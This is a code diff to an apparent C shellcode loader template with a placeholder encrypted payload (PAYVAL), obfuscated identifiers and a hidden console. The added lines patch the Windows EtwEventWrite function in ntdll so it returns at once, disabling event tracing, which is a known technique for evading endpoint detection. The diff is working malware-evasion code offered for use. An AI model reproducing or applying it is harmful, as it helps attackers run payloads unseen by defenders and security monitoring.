@@ -66,6 +66,18 @@ int main() {
         unsigned char Random2[]=PAYVAL 
 
         unsigned int Random2_len = sizeof(Random2);
+	
+	void * addr = GetProcAddress(GetModuleHandle("ntdll.dll"), "EtwEventWrite");
+        VirtualProtect(addr, 4096, PAGE_EXECUTE_READWRITE, &oldprotect);
+
+        #ifdef _WIN64
+        memcpy(addr, "\x48\x33\xc0\xc3", 4);            
+        #else
+        memcpy(addr, "\x33\xc0\xc2\x14\x00", 5);                
+        #endif  
+
+        VirtualProtect(addr, 4096, oldprotect, &oldprotect);
+
         FreeConsole();
         Random1((char *) Random2, Random2_len, Random3, sizeof(Random3));
         
